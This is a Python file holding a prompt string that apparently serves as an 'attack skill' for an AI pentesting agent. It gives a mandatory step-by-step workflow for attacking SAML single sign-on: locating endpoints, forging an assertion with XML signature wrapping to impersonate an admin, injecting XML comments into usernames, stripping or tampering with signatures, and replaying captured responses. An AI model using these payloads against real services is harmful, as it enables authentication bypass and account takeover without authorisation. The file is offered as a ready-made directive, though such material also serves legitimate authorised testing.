"""
SAML Attack Skill Prompt.
"""

SAML_SKILL_PROMPT = """
## ATTACK SKILL: SAML ATTACKS

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
Find SAML endpoints: `/saml/login`, `/saml/SSO`, `/sso`, `/auth/saml`, `SAMLResponse` in POST body or query string.

#### STEP 2: XML SIGNATURE WRAPPING (XSW 1-8)
```xml
<!-- XSW1: Move original assertion to comment, inject forged -->
<SAMLResponse>
  <Assertion ID="forged">
    <Subject><NameID>admin@target.com</NameID></Subject>
    <Conditions><AudienceRestriction><Audience>SP_ID</Audience></AudienceRestriction></Conditions>
    <AuthnStatement AuthnInstant="2024-01-01T00:00:00Z"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef></AuthnContext></AuthnStatement>
  </Assertion>
  <!--original assertion moved here as comment-->
</SAMLResponse>
```

#### STEP 3: XML COMMENT INJECTION
If user input reaches SAML XML before signing:
```
username: admin<!--comment-->@target.com
```

#### STEP 4: SIGNATURE BYPASS
- Remove signature entirely (if not enforced)
- Change signature algorithm to `None`
- Certificate tampering: replace signing cert with self-signed

#### STEP 5: REPLAY ATTACK
Capture SAMLResponse, replay within validity window (NotOnOrAfter).

#### ANTI-PATTERNS: Don't only try XSW1 — there are 8 XSW variants. Test signature stripping before complex wrapping attacks.
"""
